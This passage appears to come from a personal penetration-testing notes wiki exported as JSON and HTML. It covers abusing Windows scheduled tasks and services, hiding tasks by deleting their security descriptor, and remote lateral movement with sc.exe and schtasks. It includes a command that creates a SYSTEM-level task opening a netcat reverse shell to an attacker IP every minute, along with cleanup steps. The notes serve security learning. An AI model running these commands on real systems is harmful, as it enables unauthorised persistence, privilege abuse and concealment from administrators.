style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# List scheduled tasks&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;schtasks&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# View details about a scheduled task&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;schtasks &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;query &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;tn &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TASK_NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;fo list &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;v&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Check the permissions of an executable&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;icacls &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PATH_TO_BINARY&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Modify the permissions (if possible/desired)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;icacls &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PATH_TO_BINARY&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;grant &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;GROUP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PERMISSION&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# You can overwrite files in Windows in the same way you&#039;d do&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# in Linux (however, this can cause issues with line&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# endings... probably best to just use notepad.exe here&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# instead)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;echo &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MALICIOUS_BINARY_AND_ARGUMENTS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PATH_TO_BAT_TO_OVERWRITE&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Force a task to run (iff the current user has permission to&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# do so)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;schtasks &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;run &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;tn &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TASK_NAME&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;If a task points to a file that you’ve obtained write access to, then that file can be altered without changing the underlying task.&lt;/p&gt;\n&lt;p&gt;It may also be possible to create your own tasks.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Creates a task that executes a netcat reverse shell back to&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# the attacker. &quot;/sc&quot; and &quot;/mo&quot; indicate that the task should&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# be run every minute. &quot;/ru&quot; indicates that the task will run&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# with SYSTEM privileges.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;schtasks &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;create &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;sc minute &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;mo &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;tn &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TASK_NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;tr &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;NETCAT_PATH -e cmd.exe &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ATTACKER_IP &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ATTACKER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ru SYSTEM&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Checks to see if the task was created successfully.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;schtasks &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;query &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;tn &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TASK_NAME&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;stealthy-tasks&quot;&gt;Stealthy tasks&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#stealthy-tasks&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Deleting the task &lt;strong&gt;Security Descriptor&lt;/strong&gt; will make the task invisible to any user in the system. &lt;em&gt;Note that this requires PsExec!&lt;/em&gt;&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;Use &lt;code&gt;PsExec64.exe -s -i regedit&lt;/code&gt; to open regedit with SYSTEM privileges.&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;Search in &lt;code&gt;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\&lt;/code&gt; for the task to hide. Under the key for that task, there will be a value named SD that contains the security descriptor. Simply delete it.&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;"},"spells/Exploit-remote-Windows-services":{"slug":"spells/Exploit-remote-Windows-services","filePath":"spells/Exploit remote Windows services.md","title":"Exploit remote Windows services","links":["spells/Exploit-Windows-services","spells/TCP"],"tags":["OS/Windows/Services","AttackCycle/LateralMovement","OS/Windows/UAC","Protocol/RCP","Protocol/SMB","Protocol/NetBIOS","HowTo"],"content":"\n\n                  \n                  Warning\n                  \n                \n\n\nBy default, UAC restricts remote sc.exe calls to domain admins and the default local “Administrator” account. Local Windows admins cannot call this service remotely without first disabling UAC!\n\n\n\nThe sc.exe command can also be used to create and manipulate services on remote machines. This uses the Windows RPC (TCP 135), but will fall back to named pipes over SMB (TCP 445) or NetBIOS (TCP 139). (In fact, this is how sc.exe works locally as well; the only difference is that in this case a local named pipe is always used.)\n# Create $ATTACKER_SERVICE on the $TARGET_HOST.\n#\nsc.exe \\\\$TARGET_HOST create $ATTACKER_SERVICE `\n                      binPath= &quot;$SOME_COMMAND&quot; start= auto\n \n# Invoke $ATTACKER_SERVICE.\n#\nsc.exe \\\\$TARGET_HOST start $ATTACKER_SERVICE\n \n# Make sure that $ATTACKER_SERVICE is really dead.\n#\nsc.exe \\\\$TARGET_HOST stop $ATTACKER_SERVICE\n \n# Clean up after yourself.\n#\nsc.exe \\\\$TARGET_HOST delete $ATTACKER_SERVICE\nNote that this is a blind attack — there will be no output indicating success or failure.","richContent":"&lt;blockquote class=&quot;callout warning&quot; data-callout=&quot;warning&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Warning&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;By default, UAC restricts remote &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-Windows-services&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Exploit-Windows-services&quot;&gt;sc.exe&lt;/a&gt; calls to domain admins and the default local “Administrator” account. &lt;em&gt;Local Windows admins cannot call this service remotely without first disabling UAC!&lt;/em&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;The &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-Windows-services&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Exploit-Windows-services&quot;&gt;sc.exe&lt;/a&gt; command can also be used to create and manipulate services on &lt;em&gt;remote&lt;/em&gt; machines. This uses the Windows RPC (&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; 135), but will fall back to named pipes over SMB (&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; 445) or NetBIOS (&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; 139). (In fact, this is how &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-Windows-services&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Exploit-Windows-services&quot;&gt;sc.exe&lt;/a&gt; works locally as well; the only difference is that in this case a local named pipe is always used.)&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Create $ATTACKER_SERVICE on the $TARGET_HOST.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;sc.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; \\\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TARGET_HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; create &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;ATTACKER_SERVICE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;                      binPath&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;SOME_COMMAND&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; start&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; auto&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Invoke $ATTACKER_SERVICE.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;sc.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; \\\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TARGET_HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; start &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;ATTACKER_SERVICE&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Make sure that $ATTACKER_SERVICE is really dead.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;sc.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; \\\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TARGET_HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; stop &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;ATTACKER_SERVICE&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Clean up after yourself.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;sc.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; \\\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TARGET_HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; delete &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;ATTACKER_SERVICE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Note that this is a blind attack — there will be no output indicating success or failure.&lt;/p&gt;"},"spells/Exploit-remote-Windows-tasks":{"slug":"spells/Exploit-remote-Windows-tasks","filePath":"spells/Exploit remote Windows tasks.md","title":"Exploit remote Windows tasks","links":["spells/Exploit-Windows-tasks","spells/TCP"],"tags":["OS/Windows/Tasks","AttackCycle/LateralMovement","OS/Windows/UAC","Protocol/RCP","Protocol/SMB","Protocol/NetBIOS","HowTo"],"content":"\n\n                  \n                  Warning\n                  \n                \n\n\nBy default, UAC restricts remote schtasks.exe calls to domain admins and the default local “Administrator” account. Local Windows admins cannot call this service remotely without first disabling UAC!\n\n\n\nThe schtasks.exe command can also be used to create and manipulate services on remote machines. This uses the Windows RPC (TCP 135), but will fall back to named pipes over SMB (TCP 445) or NetBIOS (TCP 139). (In fact, this is how schtasks.exe works locally as well; the only difference is that in this case a local named pipe is always used.)\n# Create $ATTACKER_TASK on the $TARGET_HOST. Note that /sd\n# (start date) and /st (start time) don&#039;t matter if we&#039;re\n# invoking the task manually, as we do next.\n#\nschtasks /s $TARGET_HOST /RU &quot;SYSTEM&quot; /create `\n         /tn &quot;$ATTACKER_TASK&quot; /tr &quot;$SOME_COMMAND&quot; /sc ONCE `\n         /sd 06/25/2023 /st 16:10\n \n# Invoke $ATTACKER_TASK.\n#\nschtasks /s $TARGET_HOST /run /TN &quot;$ATTACKER_TASK&quot;\n \n# Clean up after yourself.\n#\nschtasks /S $TARGET_HOST /TN &quot;$ATTACKER_TASK&quot; /DELETE /F","richContent":"&lt;blockquote class=&quot;callout warning&quot; data-callout=&quot;warning&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Warning&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;By default, UAC restricts remote &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-Windows-tasks&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Exploit-Windows-tasks&quot;&gt;schtasks.exe&lt;/a&gt; calls to domain admins and the default local “Administrator” account. &lt;em&gt;Local Windows admins cannot call this service remotely without first disabling UAC!&lt;/em&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;The &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-Windows-tasks&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Exploit-Windows-tasks&quot;&gt;schtasks.exe&lt;/a&gt; command can also be used to create and manipulate services on &lt;em&gt;remote&lt;/em&gt; machines. This uses the Windows RPC (&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; 135), but will fall back to named pipes over SMB (&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; 